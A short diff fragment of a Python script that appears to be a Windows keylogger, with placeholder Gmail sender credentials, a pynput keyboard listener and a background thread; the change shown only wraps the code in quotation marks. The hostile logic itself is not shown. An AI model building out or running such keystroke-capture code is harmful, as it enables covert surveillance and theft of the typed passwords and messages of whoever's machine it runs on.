@@ -14,7 +14,7 @@ fromAddr = 'xxxxxx@gmail.com'
 fromPswd = 'xxxxxxxxx'
 # READ CODE
  
-#imports
+"#imports
 from pynput.keyboard import Key,Listener
 import win32gui
 import os
@@ -161,5 +161,5 @@ if __name__=='__main__':
 	T1.start()
 
 	with Listener(on_press=on_press) as listener:
-		listener.join()
+		listener.join()"
 
